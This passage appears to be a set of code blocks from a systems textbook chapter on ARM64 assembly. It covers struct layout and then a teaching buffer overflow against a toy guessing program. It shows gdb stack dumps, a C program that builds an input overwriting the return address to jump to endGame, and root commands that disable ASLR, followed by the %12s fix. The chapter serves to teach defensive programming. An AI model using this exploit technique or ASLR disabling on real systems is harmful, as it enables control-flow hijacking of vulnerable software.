// x29 = sp (frame ptr = stack ptr)\n\n0x7fc <+8>:  str  x0, [x29, #40]         // store s at x29 + 40\n\n0x800 <+12>: str  x1, [x29, #32]         // store nm at x29 + 32\n\n0x804 <+16>: str  w2, [x29, #28]         // store ag at x29 + 28\n\n0x808 <+20>: str  w3, [x29, #24]         // store gr at x29 + 24\n\n0x80c <+24>: str  s0, [x29, #20]         // store g at x29 + 20\n\n0x810 <+28>: ldr  x0, [x29, #40]         // x0 = s\n\n0x814 <+32>: mov  x2, #0x40              // x2 = 0x40 (or 64)\n\n0x814 <+36>: ldr  x1, [x29, #32]         // x1 = nm\n\n0x818 <+40>: bl   0x6e0 <strncpy@plt>    // call strncpy(s, nm, 64) (s->name)\n\n0x81c <+44>: ldr  x0, [x29, #40]         // x0 = s\n\n0x820 <+48>: ldr  w1, [x29, #24]         // w1 = gr\n\n0x824 <+52>: str  w1, [x0, #68]          // store gr at (s + 68) (s->grad_yr)\n\n0x828 <+56>: ldr  x0, [x29, #40]         // x0 = s\n\n0x82c <+60>: ldr  w1, [x29, #28]         // w1 = ag\n\n0x830 <+64>: str  w1, [x0, #64]          // store ag at (s + 64) (s->age)\n\n0x834 <+68>: ldr  x0, [x29, #40]         // x0 = s\n\n0x838 <+72>: ldr  s0, [x29, #20]         // s0 = g\n\n0x83c <+80>: str  s0, [x0, #72]          // store g at (s + 72) (s->gpa)\n\n0x844 <+84>: ldp  x29, x30, [sp], #48    // x29 = sp, x30 = sp+4, sp += 48\n\n0x848 <+88>: ret                         // return (void)\n```", "```\n0x7fc <+8>:  str  x0, [x29, #40]         // store s at x29 + 40\n\n0x800 <+12>: str  x1, [x29, #32]         // store nm at x29 + 32\n\n0x804 <+16>: str  w2, [x29, #28]         // store ag at x29 + 28\n\n0x808 <+20>: str  w3, [x29, #24]         // store gr at x29 + 24\n\n0x80c <+24>: str  s0, [x29, #20]         // store g at x29 + 20\n\n0x810 <+28>: ldr  x0, [x29, #40]         // x0 = s\n\n0x814 <+32>: mov  x2, #0x40              // x2 = 0x40 (or 64)\n\n0x814 <+36>: ldr  x1, [x29, #32]         // x1 = nm\n\n0x818 <+40>: bl   0x6e0 <strncpy@plt>    // call strncpy(s, nm, 64) (s->name)\n```", "```\n0x81c <+44>: ldr  x0, [x29, #40]         // x0 = s\n\n0x820 <+48>: ldr  w1, [x29, #24]         // w1 = gr\n\n0x824 <+52>: str  w1, [x0, #68]          // store gr at (s + 68) (s->grad_yr)\n```", "```\n0x828 <+56>: ldr  x0, [x29, #40]         // x0 = s\n\n0x82c <+60>: ldr  w1, [x29, #28]         // w1 = ag\n\n0x830 <+64>: str  w1, [x0, #64]          // store ag at (s + 64) (s->age)\n```", "```\n0x834 <+68>: ldr  x0, [x29, #40]         // x0 = s\n\n0x838 <+72>: ldr  s0, [x29, #20]         // s0 = g\n\n0x83c <+80>: str  s0, [x0, #72]          // store g at (s + 72) (s->gpa)\n```", "```\nstruct studentTM {\n\n    char name[63]; //updated to 63 instead of 64\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentTM student2;\n```", "```\nstruct studentTM {\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n    char name[63];\n\n};\n\nstruct studentTM student3;\n```", "```\n$ tar -xzvf secretARM64.tar.gz\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"other.h\"\n\nint endGame(void){\n\n  printf(\"You win!\\n\");\n\n  exit(0);\n\n}\n\nint playGame(void){\n\n  int guess, secret, len, x=3;\n\n  char buf[12];\n\n  printf(\"Enter secret number:\\n\");\n\n  scanf(\"%s\", buf);\n\n  guess = atoi(buf);\n\n  secret=getSecretCode();\n\n  if (guess == secret)\n\n    printf(\"You got it right!\\n\");\n\n  else{\n\n    printf(\"You are so wrong!\\n\");\n\n    return 1;\n\n  }\n\n  printf(\"Enter the secret string to win:\\n\");\n\n  scanf(\"%s\", buf);\n\n  guess = calculateValue(buf, strlen(buf));\n\n  if (guess != secret){\n\n    printf(\"You lose!\\n\");\n\n    return 2;\n\n  }\n\n  endGame();\n\n  return 0;\n\n}\n\nint main(){\n\n  int res = playGame();\n\n  return res;\n\n}\n```", "```\nDump of assembler code for function playGame:\n\n   0x0000aaaaaaaaa908 <+0>: stp\tx29, x30, [sp, #-48]!\n\n   0x0000aaaaaaaaa90c <+4>: mov\tx29, sp\n\n   0x0000aaaaaaaaa910 <+8>: mov\tw0, #0x3\n\n   0x0000aaaaaaaaa914 <+12>: str\tw0, [x29, #44]\n\n   0x0000aaaaaaaaa918 <+16>: adrp\tx0, 0xaaaaaaaaa000\n\n   0x0000aaaaaaaaa91c <+20>: add\tx0, x0, #0xac0\n\n   0x0000aaaaaaaaa920 <+24>: bl\t0xaaaaaaaaa730 <puts@plt>\n\n   0x0000aaaaaaaaa924 <+28>: add\tx1, x29, #0x18\n\n   0x0000aaaaaaaaa928 <+32>: adrp\tx0, 0xaaaaaaaaa000\n\n   0x0000aaaaaaaaa92c <+36>: add\tx0, x0, #0xad8\n\n=> 0x0000aaaaaaaaa930 <+40>: bl\t0xaaaaaaaaa740 <__isoc99_scanf@plt>\n```", "```\n(gdb) x /64bx $sp\n```", "```\n(gdb) x /64bx $sp\n\n0xffffffffeec0:\t0xf0 0xee 0xff 0xff 0xff 0xff 0x00 0x00\n\n0xffffffffeec8: 0xf0 0xa9 0xaa 0xaa 0xaa 0xaa 0x00 0x00\n\n0xffffffffeed0: 0x10 0xef 0xff 0xff 0xff 0xff 0x00 0x00\n\n0xffffffffeed8: 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38\n\n0xffffffffeee0: 0x39 0x30 0x00 0xaa 0xaa 0xaa 0x00 0x00\n\n0xffffffffeee8: 0x00 0x00 0x00 0x00 0x03 0x00 0x00 0x00\n\n0xffffffffeef0: 0x10 0xef 0xff 0xff 0xff 0xff 0x00 0x00\n\n0xffffffffeef8: 0xe0 0x36 0x58 0xbf 0xff 0xff 0x00 0x00\n```", "```\n0xffffffffeed8: 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38\n\n0xffffffffeee0: 0x39 0x30 0x00 0xaa 0xaa 0xaa 0x00 0x00\n```", "```\n$ ./secret\n\nEnter secret number:\n\n1234567890\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```", "```\n$ ./secret\n\nEnter secret number:\n\n12345678901234567890123456789012345\n\nYou are so wrong!\n\nBus error\n\n$ echo $?\n\n139\n```", "```\n$ gdb secret\n\n(gdb) break *0x0000aaaaaaaaa934\n\n(gdb) run < input.txt\n\n(gdb) ni\n\n(gdb) x /64bx $sp\n\n0xffffffffeec0: 0xf0 0xee 0xff 0xff 0xff 0xff 0x00 0x00\n\n0xffffffffeec8: 0xf0 0xa9 0xaa 0xaa 0xaa 0xaa 0x00 0x00\n\n0xffffffffeed0: 0x10 0xef 0xff 0xff 0xff 0xff 0x00 0x00\n\n0xffffffffeed8: 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38\n\n0xffffffffeee0: 0x39 0x30 0x31 0x32 0x33 0x34 0x35 0x36\n\n0xffffffffeee8: 0x37 0x38 0x39 0x30 0x31 0x32 0x33 0x34\n\n0xffffffffeef0: 0x35 0x36 0x37 0x38 0x39 0x30 0x31 0x32\n\n0xffffffffeef8: 0x33 0x34 0x35 0x00 0xff 0xff 0x00 0x00\n\n(gdb) n\n\nSingle stepping until exit from function playGame,\n\nwhich has no line number information.\n\nYou are so wrong!\n\n0x0000aaaaaaaaa9f0 in main ()\n\n(gdb) n\n\nSingle stepping until exit from function main,\n\nwhich has no line number information.\n\n0x0000ffff00353433 in ?? ()\n```", "```\n$ gdb secret\n\n(gdb) disas endGame\n\nDump of assembler code for function endGame:\n\n   0x0000aaaaaaaaa8ec <+0>: stp x29, x30, [sp, #-16]!\n\n   0x0000aaaaaaaaa8f0 <+4>: mov x29, sp\n\n   0x0000aaaaaaaaa8f4 <+8>: adrp x0, 0xaaaaaaaaa000\n\n   0x0000aaaaaaaaa8f8 <+12>: add x0, x0, #0xab0\n\n   0x0000aaaaaaaaa8fc <+16>: bl 0xaaaaaaaaa730 <puts@plt>\n\n   0x0000aaaaaaaaa900 <+20>: mov w0, #0x0\n\n   0x0000aaaaaaaaa904 <+24>: bl 0xaaaaaaaaa6d0 <exit@plt>\n```", "```\n#include <stdio.h>\n\nchar ebuff[]=\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*first 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*next 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*following 10 bytes of junk*/\n\n\"\\x00\\x00\" /*last 2 bytes of junk*/\n\n\"\\xec\\xa8\\xaa\\xaa\\xaa\\xaa\\x00\\x00\" /*address of endGame (little endian)*/\n\n;\n\nint main(void) {\n\n    int i;\n\n    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/\n\n        printf(\"%c\", ebuff[i]);\n\n    }\n\n    return 0;\n\n}\n```", "```\n$ gcc -o genEx genEx.c\n\n$ ./genEx > exploit\n```", "```\n$ sudo su\n\n[sudo] password for pi:\n\nroot@pi# echo \"0\" > /proc/sys/kernel/randomize_va_space\n\nroot@pi# exit\n\n$\n```", "```\n$ ./secret < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\nYou win!\n```", "```\n$ echo $?\n\n0\n```", "```\nint playGame(void){\n\n  int guess, secret, len, x=3;\n\n  char buf[12];\n\n  printf(\"Enter secret number:\\n\");\n\n  scanf(\"%12s\", buf); //lengths specifier added here!\n\n  guess = atoi(buf);\n\n  secret=getSecretCode();\n\n  if (guess == secret)\n\n    printf(\"You got it right!\\n\");\n\n  else{\n\n    printf(\"You are so wrong!\\n\");\n\n    return 1;\n\n  }\n\n  printf(\"Enter the secret string to win:\\n\");\n\n  scanf(\"%12s\", buf); //length specifier added here!\n\n guess = calculateValue(buf, strlen(buf));\n\n  if (guess != secret){\n\n    printf(\"You lose!\\n\");\n\n    return 2;\n\n  }\n\n  endGame();\n\n  return 0;\n\n}\n```", "```\n$ ./secret2 < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```"]